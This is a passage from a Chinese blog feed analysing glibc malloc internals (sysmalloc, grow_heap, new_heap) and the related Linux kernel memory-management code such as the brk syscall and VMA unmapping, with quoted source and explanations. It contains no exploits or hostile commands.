<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">static void unmap_single_vma(struct mmu_gather *tlb, struct vm_area_struct *vma,                        unsigned long start_addr, unsigned long end_addr, struct zap_details *details)&#123;</div><div class="line">    unsigned long start = max(vma-&gt;vm_start, start_addr);</div><div class="line">    unsigned long end;</div><div class="line"></div><div class="line">    if (start &gt;= vma-&gt;vm_end)</div><div class="line">        return;</div><div class="line">    end = min(vma-&gt;vm_end, end_addr);</div><div class="line">    if (end &lt;= vma-&gt;vm_start)</div><div class="line">        return;</div><div class="line"></div><div class="line">    if (vma-&gt;vm_file)</div><div class="line">        uprobe_munmap(vma, start, end);</div><div class="line"></div><div class="line">    if (unlikely(vma-&gt;vm_flags &amp; VM_PFNMAP))</div><div class="line">        untrack_pfn(vma, 0, 0);</div><div class="line"></div><div class="line">    if (start != end) &#123;</div><div class="line">        if (unlikely(is_vm_hugetlb_page(vma))) &#123;</div><div class="line">            if (vma-&gt;vm_file) &#123;</div><div class="line">                i_mmap_lock_write(vma-&gt;vm_file-&gt;f_mapping);</div><div class="line">                __unmap_hugepage_range_final(tlb, vma, start, end, NULL);</div><div class="line">                i_mmap_unlock_write(vma-&gt;vm_file-&gt;f_mapping);</div><div class="line">            &#125;</div><div class="line">        &#125; else</div><div class="line">            unmap_page_range(tlb, vma, start, end, details);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里主要就是通过<code>unmap_page_range</code>进行释放。再往下因为涉及太多linux内核内存管理的知识，这里就不深入分析了，最后就是通过虚拟地址找到页表<code>pte</code>，解开和物理页面之间的映射，并设置一些page结构。<br>由于<code>unmap_vmas</code>后，一些页表里没有了相对应的物理页面，<code>free_pgtables</code>将这些页表释放。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">void free_pgtables(struct mmu_gather *tlb, struct vm_area_struct *vma,</div><div class="line">        unsigned long floor, unsigned long ceiling)&#123;</div><div class="line"></div><div class="line">    while (vma) &#123;</div><div class="line">        struct vm_area_struct *next = vma-&gt;vm_next;</div><div class="line">        unsigned long addr = vma-&gt;vm_start;</div><div class="line"></div><div class="line">        unlink_anon_vmas(vma);</div><div class="line">        unlink_file_vma(vma);</div><div class="line"></div><div class="line">        if (is_vm_hugetlb_page(vma)) &#123;</div><div class="line">            hugetlb_free_pgd_range(tlb, addr, vma-&gt;vm_end,</div><div class="line">                floor, next? next-&gt;vm_start: ceiling);</div><div class="line">        &#125; else &#123;</div><div class="line"></div><div class="line">            while (next &amp;&amp; next-&gt;vm_start &lt;= vma-&gt;vm_end + PMD_SIZE</div><div class="line">                   &amp;&amp; !is_vm_hugetlb_page(next)) &#123;</div><div class="line">                vma = next;</div><div class="line">                next = vma-&gt;vm_next;</div><div class="line">                unlink_anon_vmas(vma);</div><div class="line">                unlink_file_vma(vma);</div><div class="line">            &#125;</div><div class="line">            free_pgd_range(tlb, addr, vma-&gt;vm_end,</div><div class="line">                floor, next? next-&gt;vm_start: ceiling);</div><div class="line">        &#125;</div><div class="line">        vma = next;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里主要是调用<code>free_pgd_range</code>。该函数中，假设要释放的虚拟内存为vma，其前一个vma为<code>prev</code>，后一个为<code>last</code>，如果释放完<code>vma</code>后，<code>prev-&gt;vm_end</code>到<code>last-&gt;vm_start</code>大于一个pgd管理的内存大小（32位系统下为4MB），就释放pgd里的所有页表，如果小于4MB，就什么也不做返回。</p>
<p>再回到<code>do_munmap</code>中，<code>arch_unmap</code>是一些体系结构相关的操作，不管它。<code>remove_vma_list</code>释放每个<code>vma</code>对应的<code>vm_area_struct</code>结构至slab分配器中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">static void remove_vma_list(struct mm_struct *mm, struct vm_area_struct *vma)&#123;</div><div class="line">    unsigned long nr_accounted = 0;</div><div class="line"></div><div class="line">    update_hiwater_vm(mm);</div><div class="line">    do &#123;</div><div class="line">        long nrpages = vma_pages(vma);</div><div class="line"></div><div class="line">        if (vma-&gt;vm_flags &amp; VM_ACCOUNT)</div><div class="line">            nr_accounted += nrpages;</div><div class="line">        vm_stat_account(mm, vma-&gt;vm_flags, vma-&gt;vm_file, -nrpages);</div><div class="line">        vma = remove_vma(vma);</div><div class="line">    &#125; while (vma);</div><div class="line">    vm_unacct_memory(nr_accounted);</div><div class="line">    validate_mm(mm);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>主要的函数是<code>remove_vma</code>，该函数通过<code>kmem_cache_free</code>释放对应的<code>vma</code>，并返回链表上的下一个<code>vma</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">static struct vm_area_struct *remove_vma(struct vm_area_struct *vma)&#123;</div><div class="line"></div><div class="line">    struct vm_area_struct *next = vma-&gt;vm_next;</div><div class="line"></div><div class="line">    might_sleep();</div><div class="line">    if (vma-&gt;vm_ops &amp;&amp; vma-&gt;vm_ops-&gt;close)</div><div class="line">        vma-&gt;vm_ops-&gt;close(vma);</div><div class="line">    if (vma-&gt;vm_file)</div><div class="line">        fput(vma-&gt;vm_file);</div><div class="line">    mpol_put(vma_policy(vma));</div><div class="line">    kmem_cache_free(vm_area_cachep, vma);</div><div class="line">    return next;</div><div class="line">&#125;</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[malloc源码分析——5]]></title>
      <url>/2018/05/21/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%945/</url>
      <content type="html"><![CDATA[<h1 id="malloc源码分析—sysmalloc"><a href="#malloc源码分析—sysmalloc" class="headerlink" title="malloc源码分析—sysmalloc"></a>malloc源码分析—sysmalloc</h1><p>本章主要分析<code>sysmalloc</code>的代码，在《malloc源码分析—2》中已经分析了部分<code>sysmalloc</code>的代码，主要用于对分配区进行初始化。本章查看余下的代码，</p>
<h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div></pre></td><td class="code"><pre><div class="line">static void * sysmalloc(INTERNAL_SIZE_T nb, mstate av) &#123;</div><div class="line">    mchunkptr old_top;</div><div class="line">    INTERNAL_SIZE_T old_size;</div><div class="line">    char *old_end;</div><div class="line"></div><div class="line">    long size;</div><div class="line">    char *brk;</div><div class="line"></div><div class="line">    long correction;</div><div class="line">    char *snd_brk;</div><div class="line"></div><div class="line">    INTERNAL_SIZE_T front_misalign;</div><div class="line">    INTERNAL_SIZE_T end_misalign;</div><div class="line">    char *aligned_brk;</div><div class="line"></div><div class="line">    mchunkptr p;</div><div class="line">    mchunkptr remainder;</div><div class="line">    unsigned long remainder_size;</div><div class="line"></div><div class="line">    size_t pagesize = GLRO(dl_pagesize);</div><div class="line">    bool tried_mmap = false;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    old_top = av-&gt;top;</div><div class="line">    old_size = chunksize(old_top);</div><div class="line">    old_end = (char *) (chunk_at_offset(old_top, old_size));</div><div class="line">    brk = snd_brk = (char *) (MORECORE_FAILURE);</div><div class="line"></div><div class="line">    if (av != &amp;main_arena) &#123;</div><div class="line">        heap_info *old_heap, *heap;</div><div class="line">        size_t old_heap_size;</div><div class="line"></div><div class="line">        old_heap = heap_for_ptr(old_top);</div><div class="line">        old_heap_size = old_heap-&gt;size;</div><div class="line">        if ((long) (MINSIZE + nb - old_size) &gt; 0</div><div class="line">                &amp;&amp; grow_heap(old_heap, MINSIZE + nb - old_size) == 0) &#123;</div><div class="line">            av-&gt;system_mem += old_heap-&gt;size - old_heap_size;</div><div class="line">            arena_mem += old_heap-&gt;size - old_heap_size;</div><div class="line">            set_head(old_top,</div><div class="line">                    (((char *) old_heap + old_heap-&gt;size) - (char *) old_top) | PREV_INUSE);</div><div class="line">        &#125; else if ((heap = new_heap(nb + (MINSIZE + sizeof(*heap)), mp_.top_pad))) &#123;</div><div class="line">            heap-&gt;ar_ptr = av;</div><div class="line">            heap-&gt;prev = old_heap;</div><div class="line">            av-&gt;system_mem += heap-&gt;size;</div><div class="line">            arena_mem += heap-&gt;size;</div><div class="line">            top (av) = chunk_at_offset(heap, sizeof(*heap));</div><div class="line">            set_head(top (av), (heap-&gt;size - sizeof (*heap)) | PREV_INUSE);</div><div class="line"></div><div class="line">            old_size = (old_size - MINSIZE ) &amp; ~MALLOC_ALIGN_MASK;</div><div class="line">            set_head(chunk_at_offset (old_top, old_size + 2 * SIZE_SZ),</div><div class="line">                    0 | PREV_INUSE);</div><div class="line">            if (old_size &gt;= MINSIZE) &#123;</div><div class="line">                set_head(chunk_at_offset (old_top, old_size),</div><div class="line">                        (2 * SIZE_SZ) | PREV_INUSE);</div><div class="line">                set_foot(chunk_at_offset (old_top, old_size), (2 * SIZE_SZ));</div><div class="line">                set_head(old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</div><div class="line">                _int_free(av, old_top, 1);</div><div class="line">            &#125; else &#123;</div><div class="line">                set_head(old_top, (old_size + 2 * SIZE_SZ) | PREV_INUSE);</div><div class="line">                set_foot(old_top, (old_size + 2 * SIZE_SZ));</div><div class="line">            &#125;</div><div class="line">        &#125; else if (!tried_mmap)</div><div class="line">            goto try_mmap;</div><div class="line">    &#125;</div><div class="line">    else&#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先，<code>old_top</code>、<code>old_size</code>和<code>old_end</code>分别保存了top chunk的指针，大小以及尾部的地址。<br>如果是非主分配区，首先通过<code>heap_for_ptr</code>获得原top chunk对应的<code>heap_info</code>指针，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#define heap_for_ptr(ptr) \</div><div class="line">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</div></pre></td></tr></table></figure>
<p>对于非主分配区，因为每个heap是按照<code>HEAP_MAX_SIZE</code>的大小分配且对齐的，而每个topchunk存在于每个heap的剩余空间（高地址处），因此通过<code>heap_for_ptr</code>就能取出<code>heap_info</code>指针，<code>heap_info</code>保存了每个heap的相关信息。获得<code>heap_info</code>指针后，就能获得该heap当前被使用的大小并将其保存在<code>old_heap_size</code>中。<br>根据《malloc源码分析—4》，进入到sysmalloc前会尝试在top chunk分配内存，因此代码执行到这里肯定失败了。所以这里只有<code>MINSIZE + nb - old_size&gt;0</code>这一种情况，即这时的top chunk空间不足了，因此首先通过<code>grow_heap</code>尝试向heap的高地址处增加heap当前使用的大小，即top chunk的大小，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">static int grow_heap(heap_info *h, long diff) &#123;</div><div class="line">    size_t pagesize = GLRO(dl_pagesize);</div><div class="line">    long new_size;</div><div class="line"></div><div class="line">    diff = ALIGN_UP(diff, pagesize);</div><div class="line">    new_size = (long) h-&gt;size + diff;</div><div class="line">    if ((unsigned long) new_size &gt; (unsigned long) HEAP_MAX_SIZE)</div><div class="line">        return -1;</div><div class="line"></div><div class="line">    if ((unsigned long) new_size &gt; h-&gt;mprotect_size) &#123;</div><div class="line">        if (__mprotect((char *) h + h-&gt;mprotect_size,</div><div class="line">                (unsigned long) new_size - h-&gt;mprotect_size,</div><div class="line">                PROT_READ | PROT_WRITE) != 0)</div><div class="line">            return -2;</div><div class="line"></div><div class="line">        h-&gt;mprotect_size = new_size;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    h-&gt;size = new_size;</div><div class="line">    LIBC_PROBE(memory_heap_more, 2, h, h-&gt;size);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这段代码其实最关键的是<code>h-&gt;size = new_size</code>这一样，表示重新设置heap的大小至<code>new_size</code>。<br>回到sysmalloc中，假设<code>grow_heap</code>成功，即将top chunk的大小设置为<code>MINSIZE + nb</code>，则重新设置分配区使用的内存大小，并且设置top chunk的<code>size</code>至新值（注意这里的<code>size</code>不能直接设置为<code>MINSIZE + nb</code>是因为在<code>grow_heap</code>中有对齐操作）。</p>
<p>假设<code>grow_heap</code>失败，大部分情况下说明heap的使用大小已经接近其最大值<code>HEAP_MAX_SIZE</code>了，此时只能通过<code>new_heap</code>重新分配一个heap，注意传入的参数<code>mp_.top_pad</code>表示在分配内存时，额外多分配的内存。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">static heap_info * internal_function new_heap(size_t size, size_t top_pad) &#123;</div><div class="line">    size_t pagesize = GLRO(dl_pagesize);</div><div class="line">    char *p1, *p2;</div><div class="line">    unsigned long ul;</div><div class="line">    heap_info *h;</div><div class="line"></div><div class="line">    if (size + top_pad &lt; HEAP_MIN_SIZE)</div><div class="line">        size = HEAP_MIN_SIZE;</div><div class="line">    else if (size + top_pad &lt;= HEAP_MAX_SIZE)</div><div class="line">        size += top_pad;</div><div class="line">    else if (size &gt; HEAP_MAX_SIZE)</div><div class="line">        return 0;</div><div class="line">    else</div><div class="line">        size = HEAP_MAX_SIZE;</div><div class="line">    size = ALIGN_UP(size, pagesize);</div><div class="line"></div><div class="line">    p2 = MAP_FAILED;</div><div class="line">    if (aligned_heap_area) &#123;</div><div class="line">        p2 = (char *) MMAP(aligned_heap_area, HEAP_MAX_SIZE, PROT_NONE,</div><div class="line">                MAP_NORESERVE);</div><div class="line">        aligned_heap_area = NULL;</div><div class="line">        if (p2 != MAP_FAILED &amp;&amp; ((unsigned long) p2 &amp; (HEAP_MAX_SIZE - 1))) &#123;</div><div class="line">            __munmap(p2, HEAP_MAX_SIZE);</div><div class="line">            p2 = MAP_FAILED;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    if (p2 == MAP_FAILED) &#123;</div><div class="line">        p1 = (char *) MMAP(0, HEAP_MAX_SIZE &lt;&lt; 1, PROT_NONE, MAP_NORESERVE);</div><div class="line">        if (p1 != MAP_FAILED) &#123;</div><div class="line">            p2 = (char *) (((unsigned long) p1 + (HEAP_MAX_SIZE - 1))</div><div class="line">                    &amp; ~(HEAP_MAX_SIZE - 1));</div><div class="line">            ul = p2 - p1;</div><div class="line">            if (ul)</div><div class="line">                __munmap(p1, ul);</div><div class="line">            else</div><div class="line">                aligned_heap_area = p2 + HEAP_MAX_SIZE;</div><div class="line">            __munmap(p2 + HEAP_MAX_SIZE, HEAP_MAX_SIZE - ul);</div><div class="line">        &#125; else &#123;</div><div class="line">            p2 = (char *) MMAP(0, HEAP_MAX_SIZE, PROT_NONE, MAP_NORESERVE);</div><div class="line">            if (p2 == MAP_FAILED)</div><div class="line">                return 0;</div><div class="line"></div><div class="line">            if ((unsigned long) p2 &amp; (HEAP_MAX_SIZE - 1)) &#123;</div><div class="line">                __munmap(p2, HEAP_MAX_SIZE);</div><div class="line">                return 0;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    if (__mprotect(p2, size, PROT_READ | PROT_WRITE) != 0) &#123;</div><div class="line">        __munmap(p2, HEAP_MAX_SIZE);</div><div class="line">        return 0;</div><div class="line">    &#125;</div><div class="line">    h = (heap_info *) p2;</div><div class="line">    h-&gt;size = size;</div><div class="line">    h-&gt;mprotect_size = size;</div><div class="line">    LIBC_PROBE(memory_heap_new, 2, h, h-&gt;size);</div><div class="line">    return h;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先对需要分配的内存大小size做相应的调整。<code>aligned_heap_area</code>表示上一次<code>MMAP</code>分配后的结束地址，如果存在，就首先尝试从该地址分配大小为<code>HEAP_MAX_SIZE</code>的内存。<code>MMAP</code>最后是系统调用，对应的内核函数在《malloc源码分析—2》中已经介绍过了，这里只是一些标志位的区别。分配完后，会检查地址是否对齐，如果不对齐也是失败。<br>如果第一次分配失败了，就会再尝试一次，这次分配<code>HEAP_MAX_SIZE*2</code>大小的内存，并且新内存的起始地址由内核决定。因为尝试分配了<code>HEAP_MAX_SIZE*2</code>大小的内存，其中必定包含了大小为<code>HEAP_MAX_SIZE</code>且和<code>HEAP_MAX_SIZE</code>对齐的内存，因此一旦分配成功，就从中截取出这部分内存。<br>如果连第二次也分配失败了，就会通过<code>MMAP</code>进行第三次分配，这次只分配<code>HEAP_MAX_SIZE</code>大小的内存，并且起始地址由内核决定，如果又失败了就返回0。<br>如果三面三次分配内存任何一次成功，就设置相应的可读写位置，并且返回分配区的<code>heap_info</code>指针。</p>
<p>重新回到<code>sysmalloc</code>中，假设分配成功，就会对刚刚分配得到的heap做相应的设置，其中<code>ar_ptr</code>表示所属的分配区的指针，<code>prev</code>表示上一个heap，所有的heap通过<code>prev</code>形成单向链表，然后通过<code>set_head</code>设置av分配区top chunk的<code>size</code>，这里也可以看出，对于刚分配的heap，包含了<code>heap_info</code>指针、top chunk、以及大于size的未被使用的部分。<br>再接下来就要对原来的top chunk进行最后的处理，这里假设对齐，如果原top chunk的大小不够大，就将其分割成<code>old_size + 2 * SIZE_SZ</code>和<code>2 * SIZE_SZ</code>大小；如果原top chunk的大小足够大，就将其分割成<code>old_size</code>，<code>2 * SIZE_SZ</code>和<code>2 * SIZE_SZ</code>大小，并通过<code>_int_free</code>进行释放。</p>
<h2 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h2><p>继续往下看<code>sysmalloc</code>，上面一部分代码主要是针对非主分配区的操作，下面的这段代码就是针对主分配区的操作了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">static void * sysmalloc(INTERNAL_SIZE_T nb, mstate av) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    if (av != &amp;main_arena) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    else&#123;</div><div class="line">        size = nb + mp_.top_pad + MINSIZE;</div><div class="line">        if (contiguous(av))</div><div class="line">            size -= old_size;</div><div class="line">        size = ALIGN_UP(size, pagesize);</div><div class="line"></div><div class="line">        if (size &gt; 0) &#123;</div><div class="line">            brk = (char *) (MORECORE(size));</div><div class="line">            LIBC_PROBE (memory_sbrk_more, 2, brk, size);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (brk != (char *) (MORECORE_FAILURE)) &#123;</div><div class="line">            void (*hook)(void) = atomic_forced_read (__after_morecore_hook);</div><div class="line">            if (__builtin_expect (hook != NULL, 0))</div><div class="line">            (*hook)();</div><div class="line">        &#125;</div><div class="line">        else&#123;</div><div class="line">            if (contiguous (av))</div><div class="line">                size = ALIGN_UP (size + old_size, pagesize);</div><div class="line"></div><div class="line">            if ((unsigned long) (size) &lt; (unsigned long) (MMAP_AS_MORECORE_SIZE))</div><div class="line">                size = MMAP_AS_MORECORE_SIZE;</div><div class="line"></div><div class="line">            if ((unsigned long) (size) &gt; (unsigned long) (nb))&#123;</div><div class="line">                char *mbrk = (char *) (MMAP (0, size, PROT_READ | PROT_WRITE, 0));</div><div class="line"></div><div class="line">                if (mbrk != MAP_FAILED)&#123;</div><div class="line">                    brk = mbrk;</div><div class="line">                    snd_brk = brk + size;</div><div class="line">                    set_noncontiguous (av);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>MORECORE</code>是一个宏定义，其最终是通过系统调用分配内存，定义在linux内核的mmap.c文件中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">SYSCALL_DEFINE1(brk, unsigned long, brk)&#123;</div><div class="line"></div><div class="line">    unsigned long retval;</div><div class="line">    unsigned long newbrk, oldbrk;</div><div class="line">    struct mm_struct *mm = current-&gt;mm;</div><div class="line">    unsigned long min_brk;</div><div class="line">    bool populate;</div><div class="line"></div><div class="line">    down_write(&amp;mm-&gt;mmap_sem);</div><div class="line">    min_brk = mm-&gt;start_brk;</div><div class="line">    if (brk &lt; min_brk)</div><div class="line">        goto out;</div><div class="line"></div><div class="line">    if (check_data_rlimit(rlimit(RLIMIT_DATA), brk, mm-&gt;start_brk,</div><div class="line">                  mm-&gt;end_data, mm-&gt;start_data))</div><div class="line">        goto out;</div><div class="line"></div><div class="line">    newbrk = PAGE_ALIGN(brk);</div><div class="line">    oldbrk = PAGE_ALIGN(mm-&gt;brk);</div><div class="line">    if (oldbrk == newbrk)</div><div class="line">        goto set_brk;</div><div class="line"></div><div class="line">    if (brk &lt;= mm-&gt;brk) &#123;</div><div class="line">        if (!do_munmap(mm, newbrk, oldbrk-newbrk))</div><div class="line">            goto set_brk;</div><div class="line">        goto out;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (find_vma_intersection(mm, oldbrk, newbrk+PAGE_SIZE))</div><div class="line">        goto out;</div><div class="line"></div><div class="line">    if (do_brk(oldbrk, newbrk-oldbrk) != oldbrk)</div><div class="line">        goto out;</div><div class="line"></div><div class="line">set_brk:</div><div class="line">    mm-&gt;brk = brk;</div><div class="line">    populate = newbrk &gt; oldbrk &amp;&amp; (mm-&gt;def_flags &amp; VM_LOCKED) != 0;</div><div class="line">    up_write(&amp;mm-&gt;mmap_sem);</div><div class="line">    if (populate)</div><div class="line">        mm_populate(oldbrk, newbrk - oldbrk);</div><div class="line">    return brk;</div><div class="line"></div><div class="line">out:</div><div class="line">    retval = mm-&gt;brk;</div><div class="line">    up_write(&amp;mm-&gt;mmap_sem);</div><div class="line">    return retval;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先会对传入堆的新地址<code>brk</code>做一些检查，然后该新地址小于原本的<code>brk</code>，就需要通过<code>do_munmap</code>释放虚拟内存，以减少堆的大小；反之，就通过<code>do_brk</code>增加堆得大小。其中<code>find_vma_intersection</code>用来判断增加堆空间后，是否会占用已经被分配的虚拟内存，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">static inline struct vm_area_struct * find_vma_intersection(struct mm_struct * mm, unsigned long start_addr, unsigned long end_addr)&#123;</div><div class="line">    struct vm_area_struct * vma = find_vma(mm,start_addr);</div><div class="line"></div><div class="line">    if (vma &amp;&amp; end_addr &lt;= vma-&gt;vm_start)</div><div class="line">        vma = NULL;</div><div class="line">    return vma;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>因为是增加堆的大小，因此只需要关心<code>do_brk</code>函数，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div 